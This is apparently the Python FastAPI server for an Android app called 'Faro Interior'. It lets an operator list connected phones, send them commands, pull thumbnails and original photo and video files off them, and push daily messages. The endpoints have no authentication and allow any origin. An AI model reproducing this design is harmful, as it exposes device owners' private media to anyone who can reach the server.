import json
import base64
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Response, UploadFile, File
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import List, Dict, Any
from urllib.parse import unquote

app = FastAPI(title="Faro Interior - Backend Android (FINAL Definitivo)")
app.add_middleware(
    CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"],
)

# --- "BASES DE DATOS" EN MEMORIA ---
connected_agents: Dict[str, Dict[str, Any]] = {}
daily_message_cache: Dict[str, Dict[str, str]] = {}
device_media_cache: Dict[str, Any] = {}
fetch_status: Dict[str, str] = {}

# --- MODELOS DE DATOS ---
class Command(BaseModel):
    target_id: str; action: str; payload: Any
class Thumbnail(BaseModel):
    filename: str; small_thumb_b64: str
class ThumbnailChunk(BaseModel):
    thumbnails: List[Thumbnail]; is_final_chunk: bool
class BroadcastMessage(BaseModel):
    device_ids: List[str]; image_b64: str; text: str

# --- ENDPOINTS ---

@app.get("/")
async def root(): return {"message": "Servidor del Agente Android activo."}

@app.websocket("/ws/{device_id}/{device_name:path}")
async def websocket_endpoint(websocket: WebSocket, device_id: str, device_name: str):
    device_name_decoded = unquote(device_name)
    await websocket.accept()
    print(f"[CONEXIÓN] Dispositivo conectado: '{device_name_decoded}' (ID: {device_id})")
    connected_agents[device_id] = {"ws": websocket, "name": device_name_decoded}
    try:
        while True: await websocket.receive_text()
    except WebSocketDisconnect:
        name_to_print = connected_agents.get(device_id, {}).get("name", f"ID: {device_id}")
        print(f"[DESCONEXIÓN] Dispositivo desconectado: '{name_to_print}'")
        if device_id in connected_agents: del connected_agents[device_id]

@app.get("/api/get-agents")
async def get_agents():
    return [{"id": device_id, "name": data["name"]} for device_id, data in connected_agents.items()]

@app.post("/api/send-command")
async def send_command_to_agent(command: Command):
    agent = connected_agents.get(command.target_id)
    if not agent: return {"status": "error", "message": "Agente no conectado"}
    if command.action == "get_thumbnails":
        device_media_cache[command.target_id] = {}
        fetch_status[command.target_id] = "loading"
    try:
        await agent["ws"].send_text(command.json())
        return {"status": "success", "message": "Comando enviado"}
    except Exception as e: return {"status": "error", "message": str(e)}

@app.post("/api/submit_media_chunk/{device_id}")
async def submit_media_chunk(device_id: str, chunk: ThumbnailChunk):
    if device_id not in device_media_cache: device_media_cache[device_id] = {}
    for thumb in chunk.thumbnails:
        device_media_cache[device_id][thumb.filename] = thumb.dict()
    if chunk.is_final_chunk:
        fetch_status[device_id] = "complete"
    return {"status": "chunk received"}

@app.get("/api/get_media_list/{device_id}")
async def get_media_list(device_id: str):
    status = fetch_status.get(device_id, "complete")
    thumbnails = device_media_cache.get(device_id, {})
    return {"status": status, "thumbnails": thumbnails}

@app.post("/api/upload_original_file/{device_id}/{filename:path}")
async def upload_original_file(device_id: str, filename: str, file: UploadFile = File(...)):
    decoded_filename = unquote(filename)
    if device_id not in device_media_cache or decoded_filename not in device_media_cache[device_id]:
        return Response(content="Archivo no solicitado", status_code=400)
    file_bytes = await file.read()
    original_b64 = base64.b64encode(file_bytes).decode('utf-8')
    device_media_cache[device_id][decoded_filename]['original_b64'] = original_b64
    return {"status": "success"}

@app.get("/media/{device_id}/{filename:path}")
async def get_large_media(device_id: str, filename: str):
    decoded_filename = unquote(filename)
    cache = device_media_cache.get(device_id, {})
    media_item = cache.get(decoded_filename)
    if not media_item or 'original_b64' not in media_item:
        return Response(content='{"detail":"Not Found"}', status_code=404)
    try:
        file_bytes = base64.b64decode(media_item['original_b64'])
        media_type = "image/jpeg"
        if decoded_filename.lower().endswith(".mp4"): media_type = "video/mp4"
        return Response(content=file_bytes, media_type=media_type)
    except Exception as e: return Response(content=f'{{"detail":"Error: {e}"}}', status_code=500)

@app.post("/api/set_daily_message/{device_id}")
async def set_daily_message(device_id: str, data: dict):
    if "image_b64" in data and "text" in data:
        daily_message_cache[device_id] = data
        agent = connected_agents.get(device_id)
        if agent:
            command_payload = {"action": "display_message", "payload": data}
            try: await agent["ws"].send_text(json.dumps(command_payload))
            except: pass
        return {"status": "message saved"}
    return {"status": "error", "message": "Datos incompletos"}

@app.get("/api/get_daily_message/{device_id}")
async def get_daily_message(device_id: str):
    return daily_message_cache.get(device_id, {})

@app.post("/api/broadcast_message")
async def broadcast_message(data: BroadcastMessage):
    sent_to_count = 0
    message_payload = {"image_b64": data.image_b64, "text": data.text}
    for device_id in data.device_ids:
        daily_message_cache[device_id] = message_payload
        agent = connected_agents.get(device_id)
        if agent:
            command = {"action": "display_message", "payload": message_payload}
            try:
                await agent["ws"].send_text(json.dumps(command))
                sent_to_count += 1
            except Exception as e:
                print(f"Error al enviar broadcast a {device_id}: {e}")
    return {"status": "broadcast attempted", "sent_to": sent_to_count}
